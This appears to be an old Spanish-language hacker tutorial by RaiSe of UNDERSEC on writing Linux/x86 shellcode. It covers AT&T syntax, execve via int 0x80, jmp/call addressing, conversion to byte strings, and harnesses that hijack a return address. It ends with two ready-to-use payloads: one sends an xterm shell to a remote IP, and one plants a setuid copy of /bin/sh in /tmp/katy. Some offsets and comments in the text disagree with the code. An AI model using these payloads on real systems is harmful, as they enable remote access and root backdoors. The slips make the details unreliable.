@@ -1,0 +1,874 @@
+/* RaiSe - UNDERSEC Security Team */
+/* http://www.undersec.com */
+
+
+
+
+----------------
+// 0.- Indice
+----------------
+
+0.- Indice.
+1.- Prologo.
+2.- Que es y para que se usa una shellcode.
+3.- Variantes del ensamblador de Intel al de AT&T.
+  3.1.- Mov.
+  3.2.- Direcciones de memoria.
+  3.3.- Interrupciones en Linux (syscalls).
+4.- 'Codeando' una shellcode simple.
+5.- 'Codeando' una shellcode de varios args.
+6.- Pasando el codigo a un string.
+7.- Comprobando una shellcode.
+8.- Sources.
+9.- Notas finales.
+
+
+-----------------
+// 1.- Prologo
+-----------------
+
+
+Nass, en este texto intentare explicar detalladamente como programar una
+shellcode bajo el sistema operativo linux y usando un procesador intel&compa-
+tible. Para comprenderlo necesitareis tener un nivel minimo de ensamblador,
+conocimientos de stack overflows, y de programacion en C. Dentro del texto
+tambien dos shellcodes desarrolladas por mi bastante practicas ;).
+
+En fin, empecemos ..
+
+
+------------------------------------------------
+// 2.- Que es y para que se usa una shellcode
+------------------------------------------------
+
+
+Una shellcode es basicamente una serie de ordenes en ensamblador que hace al-
+go de la cual sacamos provecho; ejecutar /bin/sh para obtener una shell, co-
+piar una shell y setearla con suid root, etc. Tiene unas caracteristicas de
+programacion un tanto especiales que luego veremos en detalle.
+
+Se usa para conseguir ejecutar un codigo despues de haber sobreescrito la di-
+reccion de retorno de un programa/funcion mediante un overflow, o mediante
+cualquier otro metodo valido. Es decir, el valor de la direccion de retorno
+que se sobreescribira sera la de nuestra shellcode. No me meto mucho en esto
+porque la finalidad de este texto no es como programar un xploit de buffer
+overflow, sino una shellcode. Simplemente decir que cuando se produzca el
+desbordamiento y el salto se ejecutara nuestra shellcode.
+
+
+-------------------------------------------------------
+// 3.- Variantes del ensamblador de Intel al de AT&T
+-------------------------------------------------------
+
+
+El ensamblador que usaremos para programar la shellcode varia un poco del ti-
+pico ensablador de msdos. Resumiendo aqui estan las instrucciones que se di-
+ferencian y en que:
+
+
+3.1.- Mov. 
+
+En Intel seria algo como "mov eax,1", en AT&T "movb $0x1,%al". Es decir, se
+intercambia el orden de los operandos, cuando vas a mover un dato (no una di
+reccion de memoria) le pones un '$' delante, y cuando usas un registro le po-
+nes '%'. Mov consta de 3 instrucciones: movl (4 bytes), movw (2 bytes) y movb
+(1 byte). [Decir que estas extensiones (l-w-b) son validas para cualquier ins-
+truccion].
+
+Los registros tambien tienen extensiones: eax (4 bytes), ax (2 bytes) y ah/al
+(1 byte cada uno).
+
+
+3.2.- Direcciones de memoria. 
+
+En Intel seria "mov eax,[ecx]", en AT&T "movl (%ecx),%eax". Es decir, cambia
+[] por (). Despues a las comillas se les puede añadir un numero, viendolo en
+un ejemplo: Intel -> "mov eax,[ecx+5]" AT&T -> "mov 0x3(%ecx),%eax", mueve a
+%eax el contenido que hay en la direccion de memoria del valor de %ecx + 3
+(notese que el 3 no lleva el $ delante). Tambien puedes poner un valor nega-
+tivo, ej: "mov -0x3(%ecx),%eax" (direccion de memoria - 3).
+
+
+3.3.- Interrupciones en Linux (syscalls).
+
+En linux, en vez de utilizar las famosas interrupciones que se usan en msdos,
+utilizaremos las conocidas syscalls. Una syscall tiene cierto parecido con una
+interrupcion, por ejemplo hay q pasarle unos determinados parametros. Hay
+syscall para abrir ficheros, otra para escribir en ellos, otra para cerrar-
+los, etc. Teneis una lista disponible en el fichero /usr/include/asm/unistd.h
+de vuesto linux :). Las llamadas se realizan usando la interrupcion 0x80 (es-
+to lo veremos mas adelante).
+
+Solo decir que cuando vayamos a llamar a una sycall, el numero de la misma se
+coloca en eax, y los argumentos en ebx, ecx, edx, esi y edi. El valor de re-
+torno se colocara en eax una vez finalizada la ejecucion de la syscall. Ponga-
+mos un ejemplo practico: la funcion/syscall open.. Como sabreis el prototipo
+de open seria algo como:
+
+int open(const char *pathname, int flags);
+
+Analicemos.. en eax se colocaria la syscall de open, que segun la table de
+asm/unistd.h seria el 5. En ebx colariamos una direccion de memoria (ya q es
+un puntero) que apunte a un string en memoria con el path del fichero que
+queremos abrir. Y en ecx colacariamos el valor del flag con el que queremos
+abrir el chivo. Facil, no? :). Si la syscall tuviera mas de 5 argumentos ha-
+bria que usar otro metodo que paso de explicar, ya que la gran mayoria de
+llamadas al sistema usa 5 o menos argumentos. Bueno, empecemos con nuestro
+primer codigo de una shellcode ..
+
+
+-----------------------------------------
+// 4.- 'Codeando' una shellcode simple
+-----------------------------------------
+
+
+Primero empezaremos con la tipica shellcode que ejecute /bin/sh, despues ya
+tendremos tiempo de complicarnos la vida :). Para ejecutar la shellcode
+usaremon la funcion/syscall execve. Echemos una rapida ojeada al prototipo de
+la funcion execve:
+
+int execve (const char *filename, char *const argv [], char *const envp[]);
+
+Recapitulemos..en %eax debera ir el numero de syscall perteneciente a execve,
+echamos otra ojeada al fichero /usr/include/asm/unistd.h y podemos ver lo si-
+guiente:
+
+#define __NR_execve              11
+
+En efecto, nuestra syscall es la 11 :). Sigamos con el prototipo.. si lo que
+dije antes era verdad, en %ebx deberia ir un puntero a un string que conten-
+dra el path del fichero a ejecutar, en nuestro caso /bin/sh. Es imporante
+que %ebx contenga una direccion de memoria ya que el argumento se pasa a la
+funcion como puntero (const char *filename). Sigamos.. entonces por la misma
+razon en %ecx debera haber un array de punteros (char *const argv []), que
+contendra cada uno los argumentos del filename que ejecutaremos. Como eje-
+cutaremos /bin/sh sin ningun argumento quedara algo como esto:
+
+. argv[0] -> /bin/sh
+. argv[1] -> 0x00
+
+Recordemos que un array de punteros siempre termina cuando un puntero apunta
+a un nulo. Sigamos.. char *const envp[], el tercer argumento que debera ir
+en %edx. Aqui metermos una direccion de memoria que apunte a un nulo, ya que
+no nos interesa que /bin/sh se ejecute con alguna variable de entorno que
+queramos definir. Resumiendo todo este rollo quedaria algo como esto:
+
+
+		+----------------+--------------------------+
+		|    Registro    |          Valor           |
+		+================+==========================+
+		|      %eax	 |          *0xb*           |
+		+----------------+--------------------------+	
+                |      %ebx      |   *direccion "/bin/sh"*  |
+                +----------------+--------------------------+
+                |                |   *direccion argv[]*     |
+		|      %ecx	 |   argv[0] = "/bin/sh"    |
+		|		 |   argv[1] = 0x00	    |
+                +----------------+--------------------------+
+                |      %edx      |   *direccion 0x00*       |
+                +----------------+--------------------------+
+
+
+Ahora se nos plantea un problema.. como conseguir la direccion de memoria del
+string "/bin/sh". No sabremos en que zona de memoria exacta se ejecutara la
+shellcode, por lo tanto no podemos poner una direccion 'estatica'. Para so-
+lucionarlo usaremos el metodo del jmp/call, mediante el cual no importara en
+donde se ejecute la shellcode ya que siempre sabremos la direccion exacta del
+string. Para comprenderlo hay que fijarse en lo que pasa cuando se produce un
+call (llamada a una funcion) en un codigo. Y que es lo que pasa os estareis
+preguntando, pues muy sencillo, se guarda la direccion de retorno en la pila
+para continuar su ejecucion una vez se produzca un ret, es decir, termine la
+funcion a la que se habia llamado mediante el call. Y cual es la direccion de
+retorno que se guardara en la pila?.. pues justo la siguiente a la llamada al
+call. Ahora observemos este codigo:
+
+		
+			jmp 0xa --------+
+		 +--->	popl %esi       |
+		 |	  .	        |
+		 |	  .		|
+		 |	[ codigo ]      |
+		 |	  .	        |
+		 |	  .	        |
+		 +----	call -0xc  <----+     
+			/bin/sh
+
+
+Empieza la ejecucion del codigo y encuentra el jmp 0xa, salta 10 bytes, con
+lo que se encuentra el call. El call llama a una funcion que en realidad es
+el codigo situado a -0xc, 12 bytes de memoria mas 'arriba'. Con lo cual, pri-
+mero guarda la direccion de la instruccion siguiente al call, que es la dire-
+ccion de nuestro string /bin/sh, en la pila, y salta al popl. Como lo que
+esta en el tope de la pila es la direccion del string, la guardamos en %esi
+y ya tenemos la direccion del string almacenada :).
+
+Bueno, y despues de esta pequeña introduccion veamos un codigo de una shell-
+code que funciona de verdad ejecutando /bin/sh. Lo pego entero y luego voy
+comentandolo.
+
+ 
+<-- Codigo -->
+
+        jmp    0x1f
+        popl   %esi
+        xorl   %eax,%eax
+        movb   %al,0x7(%esi)
+        movl   %esi,0x8(%esi)
+        movl   %eax,0xc(%esi)
+        movb   $0xb,%al
+        movl   %esi,%ebx
+        leal   0x8(%esi),%ecx
+        leal   0xc(%esi),%edx
+        int    $0x80
+        xorl   %eax,%eax
+        xorl   %ebx,%ebx
+        inc    %eax
+        int    $0x80
+        call   -0x24
+        .string \"/bin/sh\"
+
+<-- Fin Codigo -->
+
+
+Empecemos..
+
++ <jmp    0x1f>:
+
+Saltar al call, 0x1f es el numero de bytes que debe saltar para encontrarse
+con el call. Este numero no hay que calcularlo manualmente, a la hora de pro-
+gramar una sc se pone un valor aleatorio (p.ej 0x10), y luego se mira cual se-
+ria el valor correcto con el gdb una vez este terminado el codigo.
+
+Una vez que ejecuta el call vuelve a saltar a la instruccion siguiente al jmp,
+pero antes guarda en la pila el valor del string "/bin/sh".
+
++ <popl   %esi>:
+
+Guarda en %esi la direccion del string "/bin/sh". Sino entiendes esto mejor
+vuelve a leer el parrafo donde se explica como conseguir la direccion de un
+string ;).
+
++ <xorl   %eax,%eax>:
+
+Pone a cero %eax. No se puede poner <movl   $0x00,%eax> ya que despues, a la
+hora pasar la shellcode a un string, nos apareceria un caracter \x00. Y si en
+el string hay un nulo lo mas probable es que el programa que intentemos 'pe-
+tar' interprete ese nulo como el final del argumento/comando, pare de copiar,
+y no consigamos sobreescribir la direccion de retorno de la pila, aparte que
+solo copiaremos media shellcode en memoria. Por lo tanto siempre tendremos
+que andar jugando con registros de valor 0x00 para copiar nulos en memoria.
+ 
++ <movb   %al,0x7(%esi)>:
+
+Copiamos un un byte nulo a la direccion de memoria %esi+0x7, es decir, a la
+direccion justo despues de la 'h'. Quedaria algo como: "/bin/sh0". El nulo se
+pone para marcar el final del string.
+
++ <movl   %esi,0x8(%esi)>:
+
+Copiamos la direccion del string a la direccion de memoria %esi+0x8. Quedaria
+algo como: "/bin/sh0direccion", donde direccion apunta a "/bin/sh". Lo que
+estamos haciendo es preparar el array de punteros que le pasaremos a execve,
+lo que acabamos de hacer seria lo mismo que argv[0]="/bin/sh".
+
++ <movl   %eax,0xc(%esi)>:
+
+Copiamos un long nulo a la direccion de memoria %esi+0xc. Ahora seria algo co-
+mo: "/bin/sh0direccion0", a diferencia de que el primer 0 es un byte y el se-
+gundo 0 son 4 bytes. Acabamos de cerrar argv[] con un nulo. Entonces tenemos:
+
+	. argv[0] = "/bin/sh"
+	. argv[1] = Nulo
+
+Con lo que terminamos el array de punteros.
+
++ <movb   $0xb,%al>:
+
+Copiamos el valor 11 a %al, que es %eax en realidad ya que antes lo habiamos
+inicializado a cero con el xorl. El valor 11 es el numero de la syscall de
+execve.
+
++ <movl   %esi,%ebx>:
+
+Copiamos la direccion del string "/bin/sh" seguido de un byte nulo (que ya 
+pusimos previamente) en %ebx. Primer argumento de execve().
+
++ <leal   0x8(%esi),%ecx>:
+
+Copiamos en %ecx la direccion de memoria %esi+0x8. En dicha direccion lo que
+hay q es otra direccion apuntando a "/bin/sh" seguida de un long nulo. Segun-
+do argumento de execve().
+
++ <leal   0xc(%esi),%edx>:
+
+Copiamos en %edx la direccion %esi+0xc, es decir, la direccion de un long nu-
+lo. Tercer y ultimo argumento de execve().
+
++ <int    $0x80>:
+
+Llamamos a la syscall por medio de la interrupcion 0x80. Si todo funcionara
+correctamente no haria falta mas codigo, pero por si el execve falla es con-
+veniente añadir un exit(0). Eso es lo que vamos a hacer a continuacion.
+
++ <xorl   %eax,%eax>:
+
+Ponemos %eax a cero.
+
++ <xorl   %ebx,%ebx>:
+
+Idem con %ebx. Primer y ultimo argumento de exit().
+
++ <inc    %eax>:
+
+Incrementa %eax, que pasara a tener el valor 1 ya que antes lo habiamos ini-
+cializado a cero. El valor 1 es el numero de syscall de exit.
+
++ <int    $0x80>:
+
+Llamamos a la syscall por medio de la interrupcion 0x80.
+
+Fin :).
+
+
+------------------------------------------------
+// 5.- 'Codeando' una shellcode de varios args
+------------------------------------------------
+
+
+Para la shellcode anterior no se necesitaba pasar mas de un argumento a la
+syscall, es decir a al execve(), ya que el unico argumento que necesitabamos
+era el string "/bin/sh". Cuando necesitemos pasar mas de un arg la cosa se
+complica un poco, pero poco.. ;). Si queremos ejecutar por poner un ejemplo:
+"/bin/ls -l -a", tendremos que saber la direccion en memoria de cada argumen-
+to y pasarselas al execve() por medio del array de punteros *argv[]. Si antes
+teniamos:
+
+. argv[0] -> /bin/sh
+. argv[1] -> 0x00
+
+ahora tendremos:
+
+. argv[0] -> /bin/ls
+. argv[1] -> -l
+. argv[2] -> -a
+. argv[3] -> 0x00
+
+Es decir, lo mismo que antes pero con dos punteros mas.. (os recuerdo que
+cada argumento debe ir seguido de un byte nulo para marcar el final del
+string). Para conseguir colocar los 3 argumentos en memoria se usara un
+string tipo: "/bin/ls0-l0-a", y luego desde la propia shellcode ponemos
+cambiamos los ceros por nulos para ir marcando el final de cada argumento.
+Al final en memoria tendremos "/bin/ls(nulo)-l(nulo)-a(nulo)".
+
+Entonces veamos el codigo para ejecutar "/bin/ls -l -a", y luego voy comen-
+tandolo como en el ejemplo anterior.
+
+
+<-- Codigo -->
+
+        jmp    0x31
+        popl   %esi
+        xorl   %eax,%eax
+        movb   %al,0x7(%esi)
+        movb   %al,0xa(%esi)
+        movb   %al,0xd(%esi)
+        movl   %esi,0xe(%esi)
+        leal   0x8(%esi),%edi
+        movl   %edi,0x12(%esi)
+        leal   0xb(%esi),%edi
+        movl   %edi,0x16(%esi)
+        movl   %eax,0x1a(%esi)
+        movb   $0xb,%al
+        movl   %esi,%ebx
+        leal   0xe(%esi),%ecx
+        leal   0x1a(%esi),%edx
+        int    $0x80
+        xorl   %eax,%eax
+        xorl   %ebx,%ebx
+        inc    %eax
+        int    $0x80
+        call   -0x36
+        .string \"/bin/ls0-l0-a\"
+
+<-- Fin Codigo -->
+
+
+Retomemos.. XD
+
++ <jmp    0x1f>:
+
+Saltar al call, esto funciona exactamente que el ejemplo anterior (como casi
+todo).
+
++ <popl   %esi>:
+
+Idem de lo mismo, salvar el valor del string "/bin/ls0-l0-a" en %esi.
+
++ <xorl   %eax,%eax>:
+
+Poner %eax a cero.
+
++ <movb   %al,0x7(%esi)>:
+
+Poner un byte nulo en la direccion de memoria %esi+0x7, es decir, el string
+quedaria: "/bin/ls(nulo)-l0-a", y el cero que habia antes se pierde.
+
++ <movb   %al,0xa(%esi)>:
+
+Poner un byte nulo en la direccion de memoria %esi+0xa. El string quedaria:
+"/bin/ls(nulo)-l(nulo)-a".
+
++ <movb   %al,0xd(%esi)>:
+
+Idem, nulo en %esi+0xd, el string quedaria: "/bin/ls(nulo)-l(nulo)-a(nulo)".
+
++ <movl   %esi,0xe(%esi)>:
+
+Copia el valor de %esi en la direccion de memoria %esi+0xe. Con esto empeza-
+mos a crear el array de punteros *argv[], y le asignamos a argv[0] la dire-
+ccion de memoria del string "/bin/ls". La memoria despues de esto tendria
+este aspecto:
+
+			/bin/ls(nulo)
+			  -l(nulo)		-> Se entiende que va
+			  -a(nulo)		   todo seguido.
+	  	      (dire de '/bin/ls')
+		 
++ <leal   0x8(%esi),%edi>:
+
+Cargamos la direccion de memoria %esi+0x8 en el registro %edi. La razon de
+usar un registro intermedio (%edi), es que no podemos copiar el valor de un
+registro mas un numero en una direccion de memoria que venga definida por el
+valor de un registro mas otro numero. Es decir, "movl 0x1(%esi),0x2(%esi)"
+por ejemplo no seria valido, hay que usar un registro intermedio, en este
+caso usamos %edi. La direccion %esi+0x8 corresponde a '-l'.
+
++ <movl   %edi,0x12(%esi)>:
+
+Copiamos el valor de %edi en la direccion de memoria %esi+0x12. El 0x12 es
+el resultado de sumar la direccion del anterior argumento + 4, ya que una
+direccion de memoria ocupa 4 bytes. En este caso la direccion anterior es
+0xe(%esi), por lo tanto ahora copiaremos la segunda direccion (argv[1]) en
+0x12(%esi), para tener las direcciones seguidas en memoria y formar asi el
+array de punteros *argv[]. La memoria sera ahora algo asi:
+
+                        /bin/ls(nulo)
+                          -l(nulo)
+                          -a(nulo)
+                      (dire de '/bin/ls')
+		        (dire de '-l')
+
++ <leal   0xb(%esi),%edi>:
+
+Cargamos la dire %esi+0xb en %edi, es decir, cargamos la dire de '-a'.
+
++ <movl   %edi,0x16(%esi)>:
+
+Copiamos la dire en %esi+0x16. Memoria:
+
+                        /bin/ls(nulo)
+                          -l(nulo) 
+                          -a(nulo)
+                      (dire de '/bin/ls')
+                        (dire de '-l')
+		        (dire de '-a')
+
++ <movl   %eax,0x1a(%esi)>:
+
+Ponemos un long nulo en %esi+1a para marcar el final del array de punteros
+*argv[]. No hace falta que lo ponga pero bueno.. lo pongo igual jeje.
+
+                        /bin/ls(nulo)
+                          -l(nulo)
+                          -a(nulo)
+                      (dire de '/bin/ls')
+                        (dire de '-l')
+                        (dire de '-a')
+			 (Long nulo)
+
++ <movb   $0xb,%al>:
+
+Poner el valor 0xb (11) en %eax, perteneciente a la syscall de execve.
+
++ <leal   0xe(%esi),%ecx>:
+
+Cargar en %ecx la direccion de *argv[], con las direcciones de todos los
+argumentos a ejecutar.
+
++ <leal   0x1a(%esi),%edx>:
+
+Cargar un long nulo en %edx.
+
++ <int    $0x80>:
+
+Ejecutar la interrupcion 0x80 para llamar a la syscall.
+
+Lo siguiente es la llamada a exit(0) por si falla el execve, que como es
+exactamente igual que en el ejemplo anterior paso de cometarlo. Bueno, y
+ya tenemos la shellcode lista, ahora veamos como se pasa a un string..
+
+
+---------------------------------------
+// 6.- Pasando el codigo a un string
+---------------------------------------
+
+
+Para pasar el codigo en ensamblador al tipico string tipo "\xeb\x4f.." hay 2
+metodos. Uno es hacerlo manualmente, un poco rollazo la verdad, pero yo ni
+me he molestado en hacerlo de otra manera.. Otro metodo es usar algun progra-
+milla que te pase el codigo directamente a un string. Aqui explicare solamen-
+te la manera tradicional.
+
+Pues bien, es muy sencillo. Cogemos el codigo y lo metemos enterito a la
+funcion _asm_, de tal forma que el source en C quede algo como:
+
+#include <stdio.h>
+
+main()
+{
+_asm_(
+  .
+  .
+codigo
+  .
+  .
+);
+}
+
+Despues lo compilamos y lo ejecutamos con el gdb, en el ejemplo de antes:
+
+$gdb shellcode
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.16 (i586-unknown-linux), Copyright 1996 Free Software Foundation, Inc...
+(gdb)
+(gdb)disass main
+Dump of assembler code for function main:
+0x8048404 <main>:       pushl  %ebp
+0x8048405 <main+1>:     movl   %esp,%ebp
+0x8048407 <main+3>:     jmp    0x8048428 <main+36> -> aqui empieza la scode
+0x8048409 <main+5>:     popl   %esi
+0x804840a <main+6>:     xorl   %eax,%eax
+[..]
+(gdb) x/1xb main+3
+0x8048407 <main+3>:     0xeb
+(gdb) x/1xb main+4
+0x8048408 <main+4>:     0x1f
+
+Vamos cogiendo esos valores y los vamos poniendo en el array, quedando algo
+parecido a esto:
+
+char shellcode[] = "\xeb\x1f..";
+
+Y vamos rellenando hasta el final, que acabara con tres \xff. Despues copia-
+mos el string /bin/sh. Al final la shellcode quedara algo como:
+
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+Y ya esta, lista para ser utilizada :).
+
+
+-----------------------------------
+// 7.- Comprobando una shellcode
+-----------------------------------
+
+
+Para comprobar facilmente si una shellcode funciona podemos usar el siguiente
+codigo en C.
+
+
+<-- Codigo -->
+
+#include <stdio.h>
+
+char shellcode[] = shellcode;	// aqui poner la sc evidentemente :)
+
+main() {
+int *ret;
+ret+=2;
+*ret = (int)shellcode;
+}
+
+<-- Fin Codigo -->
+
+
+Lo que hacemos es definir un puntero (ret). Como ret es lo unico que esta en
+la pila (al declarar la shellcode fuera de main como variable global), si in-
+crementamos en 2 posiciones la direccion a la que apunta ret haremos que
+apunte a la direccion de retorno de main(). Por lo tanto lo incrementamos en
+2 (al ser un puntero a entero cada incremento vale 4 bytes), y despues hace-
+mos que apunte a la shellcode, con lo que la misma se ejecutara a la vuelta
+de main(). Quizas con un ejemplo 'grafico' se vea mas claro. Nada mas definir
+ret, la memoria tendria este aspecto:
+
+			
+			  [Shellcode]
+
+			+--------------+
+			|     PILA     |
+			+==============+
+			|     ret      |	# 4 bytes
+			+--------------+	
+			|     ebp      |	# 4 bytes
+			+--------------+
+			|   direccion  |	# 4 bytes
+			|  de retorno  |
+			+--------------+
+
+
+Entonces si modificamos ret para que apunte a la direccion de retorno (direccion
+de ret + 16 bytes), y sobreescribimos la direccion de retorno para que apunte
+a la shellcode, quedaria algo como:
+
+
+                          [Shellcode]
+		    	
+                        +--------------+
+                        |     PILA     |
+                        +==============+
+                        |     ret      | ---+	# 4 bytes
+                        +--------------+    |	
+                        |     ebp      |    |	# 4 bytes
+                        +--------------+    |
+                        | direccion de |    |	# 4 bytes
+                        | [shellcode]  | <--+
+                        +--------------+
+
+
+Con lo que conseguimos ejecutar la shellcode. Lo malo de este codigo es que cada
+vez que queramos testear una scode tendremos que pasarla primero a string, y si
+esto lo hacemos manualmente podemos llegar a perder mucho tiempo en cada testeo.
+Por lo tanto lo mejor seria usar este otro codigo:
+
+
+<-- Codigo -->
+
+#include <stdio.h>
+
+shellcode(){
+asm("
+
+[poner el codigo de la shellcode en asm aqui]
+
+");
+}
+
+main() {
+int *ret;
+char scode[512];
+
+strcpy(scode,(char*)shellcode);
+
+ret+=2;
+*ret = (int)scode;
+}
+
+<-- Fin Codigo -->
+
+
+Con esto conseguimos el mismo efecto que antes pero sin tener que pasar la
+shellcode a un string, ya que el codigo lo hace automaticamente mediante un
+strcpy.
+
+
+-----------------
+// 8.- Sources
+-----------------
+
+
+Aqui pego dos codigos de shellcodes echas por mi. La primera ejecuta un xterm
+remoto, comprobando el tamaño de la ip, pudiendo cambiar una ip por otra sin
+problema. La orden exacta que ejecuta es "xterm -ut -display ip:0". Para ha-
+cer la comprobacion simplemente usa un bucle que va comprobando byte a byte
+hasta que encuentra el caracter 'K', cuando lo encuentra lo cambia por un nulo
+que marca el final del string, y por tanto del argumento del execve.
+
+La segunda lo que hace es copiar "/bin/sh" a "/tmp/katy" y luego darle suid con
+el uid del usuario que ejecuto la shellcode, si es root pues root. Para ello
+usa fork() y wait_pid() ejecundo cada proceso por separado. El proceso hijo
+hace un execve de "/bin/cp /bin/sh /tmp/katy". Como es la shellcode la que se
+encarga de ejecutar el 'copy', el fichero "/tmp/katy" tendra como owner el uid
+del proceso que ejecuto la shellcode.. Si por ejemplo la shellcode la ejecuto
+un proceso que estaba corriendo con suid de root "/tmp/katy" sera algo como:
+
+-rw-r--r--   1 root     root         5489 Oct 18 22:13 katy
+
+Mientras tanto el proceso padre estara esperando que termine la ejecucion del
+proceso hijo por medio de una llamada a la funcion/syscall wait_pid. Cuando eso
+ocurra el proceso padre hara un chmod a 'katy', por medio de la syscall chmod,
+para que el fichero quede algo como esto:
+
+-r-sr-xr-x   1 root     root         5489 Oct 18 22:13 katy
+
+Es decir, al final "/tmp/katy" sera una copia de "/bin/sh", con la particulari-
+dad de tener suid de root (en nuestro caso hipotetico).
+
+Salta a la vista que la primera shellcode (xterm.c), es mas practica para
+xploits remotos, mientras que la segunda (sh_tmp.c) lo es para xploits locales. 
+Para extraer ambas shellcodes a archivos por separado no teneis mas que ejecutar
+"./nextract 0x04.txt". Se copiaran en los ficheros xterm.c y sh_tmp.c respectiva-
+mente, dentro del directorio "./shellcodes/".
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-= Shellcodes -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+<++> shellcodes/xterm.c $8d870618a5f2e4d0ca73dff16074e7b2
+/*
+ *  Linux/x86
+ *
+ *  execve() of /usr/X11R6/bin/xterm -ut -display ip:0, exit()
+ *  127.0.0.1 is an example, you must change it to a useful ip
+ *  (making a subrutine into the exploit?)
+ *  - you must not delete 'K' after ip:0 -
+ */
+
+
+char shellcode[] =
+"\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b"
+"\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88"
+"\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d"
+"\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e"
+"\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xac\xff\xff\xff"
+"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K";
+
+
+/* Code */
+/*
+__asm__("
+jmp    0x4f
+popl   %esi
+xorl   %edx,%edx
+movb   %dl,0x14(%esi)
+movb   %dl,0x18(%esi)
+movb   %dl,0x21(%esi)
+movb   $0x2b,%dl
+xorl   %ecx,%ecx
+movb   $0x9,%cl
+cmpb   $0x4b,(%edx,%esi)
+je     0x5
+inc    %edx
+loop   -0x9
+jmp    0x2b
+movb   %dh,(%edx,%esi)
+xorl   %edx,%edx
+movl   %esi,%ebx
+movl   %esi,0x36(%esi)
+leal   0x15(%esi),%edi
+movl   %edi,0x3a(%esi)
+leal   0x19(%esi),%edi
+movl   %edi,0x3e(%esi)
+leal   0x22(%esi),%edi
+movl   %edi,0x42(%esi)
+movl   %edx,0x46(%esi)
+leal   0x36(%esi),%ecx
+leal   0x46(%esi),%edx
+xorl   %eax,%eax
+movb   $0xb,%eax
+int    $0x80
+xorl   %ebx,%ebx
+movl   %ebx,%eax
+inc    %eax
+int    $0x80
+call   -0x54
+.string \"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K\"
+");
+*/
+/* RaiSe */
+<-->
+
+<++> shellcodes/sh_tmp.c $1593e815df1d94dd70c6c1a8b1d17d31
+/*
+ *  Linux/x86
+ *
+ *  /bin/cp /bin/sh /tmp/katy ; chmod 4555 /tmp/sh using fork()
+ */
+
+
+char shellcode[] =
+"\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
+"\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
+"\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
+"\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
+"\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
+"\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
+"\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/katy";
+
+
+/* Code */
+/*
+__asm__("
+        jmp    0x5e
+        popl   %edi
+        xorl   %eax,%eax
+        movb   %al,0x7(%edi)
+        movb   %al,0xf(%edi)
+        movb   %al,0x19(%edi)
+        movl   %edi,0x1a(%edi)
+        leal   0x8(%edi),%esi
+        movl   %esi,0x1e(%edi)
+        xorl   %esi,%esi
+        leal   0x10(%edi),%esi
+        movl   %esi,0x22(%edi)
+        movl   %eax,0x26(%edi)
+        movl   %edi,%ebx
+        leal   0x1a(%edi),%ecx
+        leal   0x26(%edi),%edx
+        xorl   %eax,%eax
+        movb   $0x2,%al
+        int    $0x80
+        xorl   %esi,%esi
+        cmpl   %eax,%esi
+        jne    0x6
+        movb   $0xb,%al
+        int    $0x80
+        jmp    0x1d
+        xorl   %edx,%edx
+        xorl   %eax,%eax
+        xorl   %ebx,%ebx
+        dec    %ebx
+        leal   0x26(%edi),%ecx
+        movb   $0x7,%al
+        int    $0x80
+        xorl   %eax,%eax
+        leal   0x10(%edi),%ebx
+        xorl   %ecx,%ecx
+        movw   $0x96d,%cx
+        movb   $0xf,%al
+        int    $0x80
+        xorl   %eax,%eax
+        inc    %eax
+        xorl   %ebx,%ebx
+        int    $0x80
+        call   -0x63
+        .ascii \"/bin/cp8/bin/sh8/tmp/katy\"
+");
+*/
+/* RaiSe */
+<-->
+
+
+-----------------------
+// 9.- Notas finales
+-----------------------
+
+
+Bueno, y esto ha llegado a su fin. Como anecdotas mencionar que SI, la ver-
+sion de gdb del paste si es la que pone, es que en el momento de escribir el
+articulo lo hacia sobre un 486 con Redhat 4.2 :). Y lo de copiar la shell al
+fichero "/tmp/katy" os imaginais porque el nombrecito,no?.. (she is my pretty
+girlfriend, hehe).
+
+Pues nada mas, nos vemos. Sed buen@s ;).
+
+
+RaiSe
+
+
+
+0x00
